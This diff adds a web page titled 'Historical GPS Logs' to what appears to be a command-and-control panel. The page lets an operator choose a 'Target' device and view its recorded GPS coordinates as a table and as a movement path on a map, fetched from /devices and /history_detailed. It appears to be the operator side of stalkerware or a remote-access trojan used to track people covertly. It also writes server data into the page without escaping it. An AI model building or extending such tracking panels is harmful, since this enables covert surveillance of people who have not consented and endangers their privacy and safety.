@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anasio | Location History</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
+    <style>
+        #map {
+            height: 500px;
+            border-radius: 1rem;
+            z-index: 10;
+        }
+        /* Custom scrollbar for the table */
+        .scroller::-webkit-scrollbar { width: 6px; }
+        .scroller::-webkit-scrollbar-track { background: #f1f5f9; border-radius: 4px; }
+        .scroller::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+    </style>
+</head>
+<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
+    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
+        
+        <!-- Top Navigation Bar -->
+        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
+            <div class="flex items-center gap-4 mb-4 md:mb-0">
+                <div class="bg-blue-600 text-white p-2 rounded-lg">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold tracking-tight text-gray-900">Historical GPS Logs</h1>
+                    <p class="text-xs text-gray-500 font-medium">Location Tracking Database</p>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-6">
+                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
+                
+                <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
+                    <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
+                        <option value="">Loading...</option>
+                    </select>
+                </div>
+                
+                <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
+            </div>
+        </nav>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            
+            <!-- Left Column: Data Table -->
+            <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 lg:col-span-1 flex flex-col h-[500px]">
+                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Raw Coordinate Log</p>
+                <div class="overflow-y-auto scroller pr-2 flex-1">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="text-xs text-gray-400 border-b border-gray-100">
+                                <th class="pb-2 font-semibold">Time</th>
+                                <th class="pb-2 font-semibold">Lat</th>
+                                <th class="pb-2 font-semibold">Lon</th>
+                            </tr>
+                        </thead>
+                        <tbody id="history-table" class="text-sm text-gray-600">
+                            <!-- Dynamic Rows -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Right Column: Interactive Map -->
+            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2 relative">
+                <div id="map"></div>
+            </div>
+            
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+    <script>
+        const selectEl = document.getElementById('device-select');
+        const tableBody = document.getElementById('history-table');
+
+        // Initialize Map
+        const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap contributors &copy; CARTO'
+        }).addTo(map);
+
+        let pathLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8, dashArray: '5, 10', lineJoin: 'round'}).addTo(map);
+        let markersGroup = L.layerGroup().addTo(map);
+
+        const dotIcon = L.divIcon({
+            className: 'custom-icon',
+            html: `<div class="bg-red-500 rounded-full w-3 h-3 border border-white"></div>`,
+            iconSize: [12, 12],
+            iconAnchor: [6, 6]
+        });
+
+        async function fetchAvailableDevices() {
+            try {
+                const devRes = await fetch('/devices');
+                const devData = await devRes.json();
+                if (devData.devices && devData.devices.length > 0) {
+                    selectEl.innerHTML = '';
+                    devData.devices.forEach(did => {
+                        const opt = document.createElement('option');
+                        opt.value = did; opt.textContent = did;
+                        selectEl.appendChild(opt);
+                    });
+                } else {
+                    selectEl.innerHTML = '<option value="">No devices</option>';
+                }
+            } catch(err) { console.error(err); }
+        }
+
+        async function fetchHistory() {
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return;
+            
+            try {
+                const res = await fetch(`/history_detailed?device_id=${encodeURIComponent(activeDevice)}`);
+                const data = await res.json();
+                
+                tableBody.innerHTML = '';
+                markersGroup.clearLayers();
+                
+                if(data.history && data.history.length > 0) {
+                    // Populate Table
+                    data.history.forEach(row => {
+                        const tr = document.createElement('tr');
+                        tr.className = "border-b border-gray-50 hover:bg-gray-50 transition";
+                        tr.innerHTML = `
+                            <td class="py-2 text-xs font-mono font-bold text-gray-800">${row.time}</td>
+                            <td class="py-2 ml-2">${row.lat.toFixed(5)}</td>
+                            <td class="py-2">${row.lon.toFixed(5)}</td>
+                        `;
+                        tableBody.appendChild(tr);
+                    });
+
+                    // Update Map (History arrives sorted newest first for table, we need newest last for path drawing)
+                    const pathCoords = data.history.slice().reverse().map(r => [r.lat, r.lon]);
+                    pathLine.setLatLngs(pathCoords);
+                    
+                    data.history.forEach(row => {
+                        L.marker([row.lat, row.lon], {icon: dotIcon})
+                         .bindPopup(`<b>Time:</b> ${row.time}<br><b>Lat:</b> ${row.lat}<br><b>Lon:</b> ${row.lon}`)
+                         .addTo(markersGroup);
+                    });
+
+                    map.fitBounds(pathLine.getBounds(), { padding: [50, 50] });
+                } else {
+                    tableBody.innerHTML = '<tr><td colspan="3" class="py-4 text-center text-xs text-gray-400">No GPS data found</td></tr>';
+                    pathLine.setLatLngs([]);
+                }
+            } catch(e) {
+                console.error(e);
+            }
+        }
+
+        async function init() {
+            await fetchAvailableDevices();
+            await fetchHistory();
+        }
+
+        selectEl.addEventListener('change', fetchHistory);
+        init();
+    </script>
+</body>
+</html>
